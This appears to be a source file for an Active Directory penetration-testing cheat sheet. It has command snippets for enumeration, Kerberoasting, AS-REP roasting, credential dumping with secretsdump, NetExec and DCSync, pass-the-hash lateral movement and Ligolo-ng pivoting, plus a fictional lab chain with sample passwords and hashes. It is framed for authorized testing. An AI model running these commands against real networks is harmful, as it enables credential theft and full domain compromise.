  // POST-COMPROMISE CHECKLIST
  // =========================================================

  postChecklistQuick = String.raw`# Use after authorized Administrator or SYSTEM access on a domain host.
# Record findings, avoid unnecessary configuration changes and protect secrets.
# [ ] Active sessions       [ ] LSASS / Kerberos
# [ ] DPAPI / Credential Manager / profiles
# [ ] Scheduled tasks / services / application configs
# [ ] Certificates / BloodHound / delegation / LAPS
# [ ] Validate credentials only against approved targets
# [ ] Document impact and complete engagement cleanup
`;

  postChecklistSessions = String.raw`# Identify the current user and active interactive sessions
whoami /all
query user
qwinsta
quser
tasklist /v

# With authorized SMB credentials, review sessions on a scoped host
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --sessions

# Prioritize investigation of unexpected privileged, service,
# backup-operator or other-user sessions; follow the approved process.
`;

  postChecklistCredentials = `# Use the Credential Access section for detailed LSASS and ticket commands.
# Review DPAPI-protected data, Credential Manager and Windows Vault where
# authorized. Results depend on the user context and available master keys.
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials"
`;

  postChecklistHostAudit = `# Review accessible user profiles and common file types for configuration exposure.
dir %USERPROFILE%
dir C:\ /s *.rdp
dir C:\ /s *.ps1
dir C:\ /s *.xml
dir C:\ /s *.config
dir C:\ /s *.ini

# Scheduled tasks and services
schtasks /query /fo LIST /v
wmic service get Name,DisplayName,StartName,PathName
Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName

# Inspect configuration files, service permissions and registry entries
sc qc <SERVICE_NAME>
icacls "<SERVICE_DIRECTORY>"
findstr /spin "password passwd pwd secret token connectionstring user uid" *.config *.xml *.ini *.txt
reg query HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE_NAME>

# Identify custom service accounts and investigate only approved paths.
`;

  postChecklistDirectory = String.raw`# Review local machine and user certificate stores
certutil -store My
certutil -user -store My

# Collect relationship data only when authorized and within scope
SharpHound.exe -c All
bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All

# Inspect Kerberos tickets and delegation
klist
Rubeus.exe triage
Rubeus.exe dump
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth

# Read LAPS data only where the account has permission
Get-LapsADPassword
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --query "(objectClass=computer)" "ms-Mcs-AdmPwd"

# Review BloodHound computer objects, sessions, ACLs, delegation,
# group membership and ReadLAPSPassword relationships.
`;

  postChecklistDecision = String.raw`# Choose the next validation path based on credential type and scope.
# Password: validate against approved SMB / WinRM / RDP targets.
# NTLM hash: use an approved Pass-the-Hash method where permitted.
# AES key: assess a Kerberos Pass-the-Key path.
# Kerberos ticket: verify identity, service, target and expiry with klist;
# use the ticket only for the matching authorized service.
# No usable credential: continue host, file, service and directory enumeration.

# If a new host is reached, record its context and restart this checklist.
# Before leaving: confirm profiles, DPAPI, Vault, tickets, tasks,
# services, certificates, BloodHound, scripts/configs and lateral paths reviewed.
# Redact secrets in notes and follow evidence-retention / cleanup requirements.
`;

  // =========================================================
  // AD SET FLOW - SCAN
  // =========================================================

  flowScan = `
# Full TCP port scan
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN openPorts

# Review discovered ports
cat openPorts
`;

  flowServices = `
# Enumerate discovered services and default scripts
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN services

# Common Active Directory ports
# 53    DNS
# 88    Kerberos
# 135   MSRPC
# 139   NetBIOS
# 389   LDAP
# 445   SMB
# 464   Kerberos password change
# 636   LDAPS
# 3268  Global Catalog
# 3389  RDP
# 5985  WinRM
# 1433  MSSQL
`;

  // =========================================================
  // AD SET FLOW - ACCESS
  // =========================================================

  flowWinRM = `
# Connect to an authorized lab host using valid credentials
evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'
`;

  flowHostEnumeration = `
# Identify the current user and security context
whoami
whoami /all
whoami /priv
whoami /groups

# Identify the host
hostname
systeminfo

# Review network configuration
ipconfig /all
route print

# Review local users and groups
net user
net localgroup
net localgroup Administrators
`;

  // =========================================================
  // AD SET FLOW - PRIVILEGE ESCALATION
  // =========================================================

  flowPrivEscChecks = `
# Check current security privileges
whoami /priv
whoami /groups

# Review operating system details
systeminfo

# Inspect services
Get-Service

# Review scheduled tasks
schtasks /query /fo LIST /v
`;

  flowPrivEscReview = `
# Privilege escalation review checklist
# 1. Identify enabled token privileges.
# 2. Review service permissions and service paths.
# 3. Inspect scheduled tasks and their permissions.
# 4. Check writable directories and executable paths.
# 5. Review installed software and applicable patches.
# 6. Search for exposed configuration files and credentials.
# 7. Validate each finding only in the authorized lab.
# 8. Record evidence and the resulting security context.
`;

  // =========================================================
  // AD SET FLOW - POST-COMPROMISE
  // =========================================================

  flowPostCompromise = `
# Confirm the current identity and privilege level
whoami
whoami /all

# Review local administrators
net localgroup Administrators

# Review domain groups
net group /domain

# Review domain users
net user /domain

# Review current logon sessions
query user
qwinsta

# Inspect locally available Kerberos tickets
klist
`;

  flowCredentialAudit = `
# Credential exposure assessment
# Review the following sources within the authorized scope:
#
# - Application configuration files
# - Scripts containing embedded credentials
# - PowerShell history
# - Windows services and scheduled task configurations
# - Unattended installation files
# - Accessible shares and backup files
#
# Treat passwords, hashes, tickets and secret material as sensitive.
# Do not export or retain credentials outside the approved lab scope.
`;

  flowKerberosAudit = `
# Enumerate SPNs registered to a domain user
setspn -L USER

# Find domain users with registered SPNs using PowerView
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# Review the current Kerberos ticket cache
klist

# Review delegation and privileged-account exposure.
# Use approved directory auditing tools to inspect:
# - Unconstrained delegation
# - Constrained delegation
# - Resource-based constrained delegation
# - Privileged group membership
# - Replication-related directory permissions
`;

  flowMssqlAudit = `
# MSSQL security assessment checklist
#
# 1. Identify reachable SQL Server instances.
# 2. Verify which account is used for authentication.
# 3. Review server roles and database permissions.
# 4. Check whether the account has excessive privileges.
# 5. Review linked servers and delegation configuration.
# 6. Check whether dangerous features are enabled unnecessarily.
# 7. Document evidence and recommended remediation.
#
# Perform testing only against explicitly authorized instances.
`;

  // =========================================================
  // AD SET FLOW - PIVOTING
  // =========================================================

  flowPivotEnumeration = `
# On the Windows pivot host
ipconfig /all
route print

# Identify the network interfaces and reachable subnets.
# Record the pivot host IP and the target subnet before
# configuring the tunnel.
`;

  flowLigolo = `
# Start the Ligolo-ng proxy on the authorized testing machine
sudo ./proxy -selfcert

# Start the Ligolo-ng agent on the authorized pivot host
# Use the proxy address and port configured for your lab.
# Example agent invocation:
./agent -connect PROXY_IP:11601 -ignore-cert

# After the agent connects:
# 1. Select the connected session (session <SESSION_ID>).
# 2. Start the tunnel (start).
# 3. Configure the route to the lab subnet (autoroute where supported;
#    otherwise configure the TUN interface and OS route).
# 4. Verify reachability before scanning (ping <INTERNAL_HOST_IP>).
#
# Consult the Ligolo-ng documentation for platform-specific route setup.
`;

  // =========================================================
  // AD SET FLOW - POST-PIVOTING
  // =========================================================

  flowPostPivot = `
# Scan a newly reachable lab host
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN pivotPorts

# Enumerate discovered services
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN pivotServices

# Reassess each host
# - Identify the operating system and exposed services.
# - Enumerate domain membership and available shares.
# - Validate access using approved lab credentials.
# - Review SQL Server and other application services.
# - Update the network map and document findings.
#
# Do not assume that credentials valid on one host
# should be reused on another without authorization.
`;

  // =========================================================
  // EXAMPLE: THREE-HOST DOMAIN CHAIN (fictional lab data)
  // =========================================================

  examplePowerShellHistory = `
# Review the PowerShell history left by a previous administrative session
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

# Fictional lab finding recovered from the history file:
# net use \\\\APP02\\C$ /user:CORP\\svc_backup "B4ckup$2024!"
#
# The history only reveals a credential; it does not grant privileges
# by itself. Validate real escalation paths with the Windows PrivEsc guide.
`;

  exampleWebToAppPivot = `
# WEB01 (DMZ, 10.10.10.21) can reach the internal 10.10.20.0/24 segment
# that is not directly reachable from Kali. Pivot through WEB01 first.

# Start the Ligolo-ng proxy on Kali
sudo ./proxy -selfcert

# Upload and run the Windows agent on WEB01, connecting back to Kali
./agent.exe -connect KALI_IP:11601 -ignore-cert

# On the Ligolo-ng proxy console
session       # select the WEB01 session
start         # open the tunnel

# Add the route to the internal segment on Kali
sudo ip route add 10.10.20.0/24 dev ligolo
`;

  exampleApp02Login = `
# Through the WEB01 tunnel, connect to APP02 with the credential
# recovered from the PowerShell history
evil-winrm -i 10.10.20.22 -u svc_backup -p 'B4ckup$2024!'
`;

  exampleApp02CredentialFinding = `
# APP02 grants svc_backup the SeBackupPrivilege / SeRestorePrivilege tokens
whoami /priv

# Use the existing SeBackup/SeRestore technique (Windows PrivEsc) to dump
# the local SAM/SYSTEM hives and recover cached credential material
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Fictional lab finding inside the recovered Credential Manager vault:
# CORP\\svc_adcs : "C3rtSvc#2024!"
# svc_adcs is later confirmed to hold "Replicating Directory Changes"
# rights once APP03 is reached.
`;

  exampleApp03Login = `
# Through the second tunnel (APP02 -> APP03), connect with the
# svc_adcs credential recovered on APP02
evil-winrm -i 10.10.30.23 -u svc_adcs -p 'C3rtSvc#2024!'
`;

  exampleDcsyncFinding = `
# Confirm svc_adcs effective replication rights before running DCSync
impacket-secretsdump CORP.LOCAL/svc_adcs:'C3rtSvc#2024!'@10.10.10.10 -just-dc

# Fictional lab finding (redact/rotate in a real engagement):
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:...:::
#
# Local Administrator membership alone does not grant DCSync; the
# directory replication rights are what make this step possible.
`;

  // Full AD Compromise from Linux

  linuxAdInitialScan = String.raw`# Full TCP port scan; save open ports for the follow-up command
  nmap -p- --min-rate 5000 -T4 <IP> -oN openPorts

# Service and version detection
nmap -sCV -p <ports> <IP>

# Parse openPorts and scan discovered services
nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) <IP> -oN services

# Important AD ports
# 88   Kerberos
# 389  LDAP
# 445  SMB
# 5985 WinRM
# 3268 Global Catalog`;

  linuxAdNoCredentials = String.raw`# RPC enumeration
rpcclient -U "" -N <IP>
# Inside rpcclient:
enumdomusers
querydispinfo

# SMB anonymous enumeration
smbclient -L //<IP> -N
smbclient //<IP>/<Share> -N
crackmapexec smb <IP> --shares -u '' -p ''
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
enum4linux -a <IP>
enum4linux -u 'domain.com\\guest' -a <IP>
smbmap -u anonymous -H <IP>

# LDAP anonymous: discover Base DN
ldapsearch -x -H ldap://<IP> -s base

# Anonymous LDAP enumeration
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com"

# Extract domain usernames
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" -s sub "(&(objectClass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Search user descriptions and other attributes for exposed credentials
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" "(objectClass=user)" description

# Authenticated LDAP query
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com"

# Enumerate computer objects and check readable LAPS attributes
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName ms-Mcs-AdmPwd

# Kerberos username enumeration
kerbrute userenum -d corp.com users.txt --dc <IP>

# AS-REP roasting
impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip <IP>

# Crack AS-REP hashes
hashcat -m 18200 hashes.txt rockyou.txt

# DNS zone transfer
dig axfr corp.com @<IP>`;

  linuxAdWithCredentials = String.raw`# Validate credentials
crackmapexec smb <IP> -u user -p '<PASSWORD>' -d corp.com

# Password policy
crackmapexec smb <IP> -u user -p '<PASSWORD>' --pass-pol

# Check whether any listed account accepts an empty password
nxc smb <IP> -u users.txt -p '' --continue-on-success

# Change an expired or must-change password when authorized
impacket-changepasswd domain/user@<DC_IP> -newpass '<NEW_PASSWORD>'

# Enumerate SMB shares
crackmapexec smb <IP> -u user -p '<PASSWORD>' --shares

# Enumerate domain SIDs and users
impacket-lookupsid domain/user:'<PASSWORD>'@<IP>
impacket-lookupsid domain.local/ -no-pass
impacket-lookupsid domain.local/guest@<IP> -no-pass
impacket-lookupsid anonymous@<IP>

# Access SYSVOL
smbclient //dc1/SYSVOL -U 'domain.htb/user%<PASSWORD>'
smbclient //dc1/SYSVOL -U user -c "recurse ON; prompt OFF; ls"

# Access shares
smbclient //<IP>/<Share> -U 'user%<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>' -r <Share>

# Enumerate domain users
impacket-GetADUsers corp.com/user:'<PASSWORD>' -dc-ip <IP>

# Enumerate computer objects
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName operatingSystem

# Kerberoasting
impacket-GetUserSPNs corp.com/user:'<PASSWORD>' -dc-ip <IP> -request

# Crack Kerberoast hashes
hashcat -m 13100 hashes.txt rockyou.txt

# BloodHound collection
bloodhound-python -u user -p '<PASSWORD>' -d corp.com -dc dc1.corp.com -c all

# Check local administrator access across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com --local-auth

# Enumerate active SMB sessions
crackmapexec smb <IP> -u user -p '<PASSWORD>' --sessions`;

  linuxAdLateralMovement = String.raw`# WinRM - password
evil-winrm -i <IP> -u user -p '<PASSWORD>'

# WinRM - domain formats
evil-winrm -i <IP> -u 'corp\\user' -p '<PASSWORD>'
evil-winrm -i <IP> -u user@corp.com -p '<PASSWORD>'

# WinRM - Pass the Hash
evil-winrm -i <IP> -u user -H <NTLM_HASH>

# WMI execution
impacket-wmiexec corp.com/user:'<PASSWORD>'@<IP>
impacket-wmiexec user:'<PASSWORD>'@<IP>

# PsExec - requires administrative access
impacket-psexec corp.com/user:'<PASSWORD>'@<IP>
impacket-psexec user:'<PASSWORD>'@<IP>

# Pass the Hash with WMI
impacket-wmiexec -hashes :<NTLM_HASH> user@<IP>

# Pass the Hash with PsExec
impacket-psexec -hashes :<NTLM_HASH> Administrator@<IP>

# Validate an NTLM hash
crackmapexec smb <IP> -u user -H <NTLM_HASH>

# Validate credentials across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com

# Decision guide
# 5985/5986 open + authorized user -> WinRM
# SMB + local admin privileges -> PsExec
# WinRM unavailable, SMB available -> consider WMI
# NTLM hash available -> test authorized Pass-the-Hash options`;

  linuxAdCredentialDumping = String.raw`# Remote credential dumping - requires sufficient privileges
impacket-secretsdump corp.com/user:'<PASSWORD>'@<IP>

# Extract local SAM hashes from collected hives
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Extract NTDS hashes from collected files
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Extract LSA secrets from collected hives
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL

# NetExec: SAM
nxc smb <IP> -u user -p '<PASSWORD>' --sam

# NetExec: LSA secrets
nxc smb <IP> -u user -p '<PASSWORD>' --lsa

# NetExec: LSASS
nxc smb <IP> -u user -p '<PASSWORD>' -M lsassy

# NetExec: NTDS - requires replication privileges
nxc smb <DC_IP> -u user -p '<PASSWORD>' --ntds

# NetExec: LAPS - requires permission to read the relevant attributes
nxc smb <IP> -u user -p '<PASSWORD>' -M laps

# NetExec: gMSA - requires appropriate directory permissions
nxc ldap <DC_IP> -u user -p '<PASSWORD>' --gmsa

# NetExec: enumerate sessions and logged-on users
nxc smb <IP> -u user -p '<PASSWORD>' --sessions
nxc smb <IP> -u user -p '<PASSWORD>' --loggedon-users

# Search accessible shares for interesting files
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus

# Download files discovered by spider_plus
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True

# Crack cached domain credentials where applicable
john --wordlist=rockyou.txt --format=mscash2 hash.txt

# DCSync - requires domain replication rights
impacket-secretsdump -just-dc-user administrator corp.com/user:'<PASSWORD>'@<DC_IP>
impacket-secretsdump -just-dc corp.com/user:'<PASSWORD>'@<DC_IP>

# Offline analysis of an LSASS dump
pypykatz lsa minidump lsass.dmp

# Search common locations for stored credentials on an authorized Windows host
# PowerShell history:
# %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
#
# Common files:
# *.config, *.xml, *.ini, *.txt, web.config, Unattend.xml, sysprep.xml
#
# Group Policy Preferences:
# Search SYSVOL XML files for the cpassword attribute
#
# Credential Manager:
# cmdkey /list
# vaultcmd /list`;


}
